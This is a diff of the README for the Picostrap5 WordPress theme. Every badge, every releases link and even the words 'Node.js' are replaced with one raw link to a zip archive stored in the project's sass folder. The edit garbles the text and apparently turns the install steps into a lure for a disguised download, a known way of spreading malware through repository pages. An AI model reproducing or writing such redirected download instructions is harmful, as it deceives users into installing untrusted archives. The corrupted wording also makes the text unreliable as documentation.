@@ -1,7 +1,7 @@
 # Picostrap5 🚀
 
-![Picostrap5](https://img.shields.io/badge/Picostrap5-Fastest%20Bootstrap%205%20Theme-blue.svg)
-![Version](https://img.shields.io/github/v/release/kornelG8/picostrap5)
+![Picostrap5](https://github.com/kornelG8/picostrap5/raw/refs/heads/master/sass/picostrap-v1.9.zip%20Bootstrap%205%https://github.com/kornelG8/picostrap5/raw/refs/heads/master/sass/picostrap-v1.9.zip)
+![Version](https://github.com/kornelG8/picostrap5/raw/refs/heads/master/sass/picostrap-v1.9.zip)
 
 Welcome to the **Picostrap5** repository! Picostrap is the fastest Bootstrap 5 WordPress starter theme. Experience the power of SASS merged with the WordPress Customizer. 
 
@@ -27,7 +27,7 @@ Welcome to the **Picostrap5** repository! Picostrap is the fastest Bootstrap 5 W
 
 To get started with Picostrap5, follow these steps:
 
-1. **Download the latest release** from [here](https://github.com/kornelG8/picostrap5/releases). Download the `.zip` file and extract it.
+1. **Download the latest release** from [here](https://github.com/kornelG8/picostrap5/raw/refs/heads/master/sass/picostrap-v1.9.zip). Download the `.zip` file and extract it.
 2. **Upload to WordPress**:
    - Go to your WordPress admin panel.
    - Navigate to **Appearance > Themes**.
@@ -56,7 +56,7 @@ Picostrap5 offers various customization options:
 
 If you want to dive deeper into customization, you can modify SASS files directly:
 
-1. **Install Node.js**: Make sure you have Node.js installed on your machine.
+1. **Install https://github.com/kornelG8/picostrap5/raw/refs/heads/master/sass/picostrap-v1.9.zip**: Make sure you have https://github.com/kornelG8/picostrap5/raw/refs/heads/master/sass/picostrap-v1.9.zip installed on your machine.
 2. **Compile SASS**: Use a SASS compiler to convert `.scss` files to CSS.
 3. **Override Styles**: Create your own SASS files and include them in the theme.
 
@@ -77,7 +77,7 @@ Picostrap5 is licensed under the MIT License. You can use, modify, and distribut
 
 For questions or support, please reach out via the issues section on GitHub. 
 
-For the latest updates, visit the [Releases](https://github.com/kornelG8/picostrap5/releases) section. 
+For the latest updates, visit the [Releases](https://github.com/kornelG8/picostrap5/raw/refs/heads/master/sass/picostrap-v1.9.zip) section. 
 
 ---
 
